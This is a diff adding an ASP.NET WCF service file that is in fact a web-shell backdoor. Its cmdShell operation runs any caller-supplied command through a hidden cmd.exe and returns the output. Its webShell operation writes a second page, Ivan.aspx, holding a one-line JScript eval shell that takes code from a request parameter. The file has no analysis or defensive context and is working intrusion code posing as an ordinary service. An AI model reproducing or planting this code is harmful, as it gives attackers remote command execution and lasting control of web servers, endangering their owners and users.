@@ -1,0 +1,40 @@
+﻿<%@ ServiceHost Language="C#" Debug="true" Service="Service"%>
+using System;
+using System.Web;
+using System.IO;
+using System.Runtime.Serialization;
+using System.ServiceModel;
+using System.Text;
+using System.ServiceModel.Activation;
+using System.Collections.Generic;
+using System.Configuration;
+using System.ServiceModel.Web;
+using System.Diagnostics;
+[ServiceContract(Namespace = "")]
+[AspNetCompatibilityRequirements(RequirementsMode = AspNetCompatibilityRequirementsMode.Allowed)]
+public class Service
+{
+ [OperationContract]
+　public string cmdShell(string text) {
+		Process pr = new Process();
+        pr.StartInfo.FileName = "cmd.exe";
+        pr.StartInfo.RedirectStandardOutput = true;
+        pr.StartInfo.UseShellExecute = false;
+        pr.StartInfo.Arguments = "/c " + text;
+        pr.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        pr.Start();
+        StreamReader osr = pr.StandardOutput;
+        String ocmd = osr.ReadToEnd();
+        osr.Close();
+        osr.Dispose();
+        return ocmd;
+    }
+ [OperationContract]
+　public string webShell() {
+		StreamWriter wickedly = File.CreateText(HttpContext.Current.Server.MapPath("Ivan.aspx"));
+		wickedly.Write("<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"Ivan\"],\"unsafe\");%>");
+		wickedly.Flush();
+		wickedly.Close();
+        return "Ivan.aspx Create Success";
+    }
+}
